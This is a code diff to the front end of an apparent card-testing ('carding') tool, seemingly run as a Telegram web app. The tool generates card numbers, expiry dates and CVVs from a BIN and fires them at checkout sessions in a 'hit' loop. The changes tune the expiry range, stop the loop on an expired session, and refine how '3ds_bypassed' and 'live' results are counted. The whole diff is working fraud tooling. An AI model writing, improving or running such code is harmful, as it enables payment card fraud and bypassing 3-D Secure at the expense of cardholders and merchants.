@@ -355,7 +355,7 @@ function generateCardsFromBin(bin, qty) {
         const cardNum = cardBase + checkDigit;
         
         const mm = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
-        const yy = Math.floor(Math.random() * (2032 - 2025) + 2025).toString().slice(-2);
+        const yy = Math.floor(Math.random() * (2031 - 2027) + 2027).toString().slice(-2);
         const cvv = isAmex 
             ? String(Math.floor(Math.random() * 9000) + 1000) 
             : String(Math.floor(Math.random() * 900) + 100);
@@ -454,6 +454,11 @@ hitBtn.addEventListener('click', async () => {
                     isHitting = false;
                     break;
                 }
+                if (result.message && result.message.includes('checkout_not_active_session')) {
+                    isHitting = false;
+                    injectLog(card, 'error', `🔴 Session Expired / Inactive. Stopping...`, elapsed);
+                    break;
+                }
                 injectLog(card, 'error', result.message || 'System Error', elapsed);
                 continue;
             }
@@ -501,7 +506,10 @@ function processHitResult(card, res, elapsed, count, total) {
         showSuccessCard(card, res, count, total);
         if (tg) tg.HapticFeedback.notificationOccurred('success');
     } else if (status === '3ds_bypassed' || status === 'live') {
-        stats.bypassed++;
+        const lowerMsg = (res.message || res.error || '').toLowerCase();
+        if (!lowerMsg.includes('authentication required') && !lowerMsg.includes('challenge required')) {
+            stats.bypassed++;
+        }
     }
 
     injectLog(res.card || card, status, message, elapsed, res.bypassed_3ds);
